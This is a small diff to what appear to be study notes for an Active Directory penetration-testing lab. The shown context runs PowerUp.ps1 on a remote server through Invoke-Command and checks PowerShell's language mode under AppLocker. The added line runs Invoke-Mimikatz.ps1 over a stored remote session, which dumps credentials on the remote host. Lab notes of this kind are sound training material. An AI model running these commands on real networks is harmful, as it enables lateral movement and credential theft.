@@ -42,6 +42,8 @@ Invoke-Command -ComputerName dcorp-adminsrv.dollarcorp.moneycorp.local -ScriptBl
 
 Invoke-Command -ComputerName dcorp-adminsrv.dollarcorp.moneycorp.local -FilePath C:\AD\Tools\PowerUp.ps1 #execute file on adminsrv machine
 
+Invoke-Command -Session $sess -FilePath C:\AD\Tools\Invoke-Mimikatz.ps1  #execute file on session stored in $sess
+
 To find out what language mode is powershell running on:
 $ExecutionContext.SessionState.LanguageMode #type in powershell (Constrained language mode or Full language mode)
 #if applocker is configured powershell will run in constrained language mode
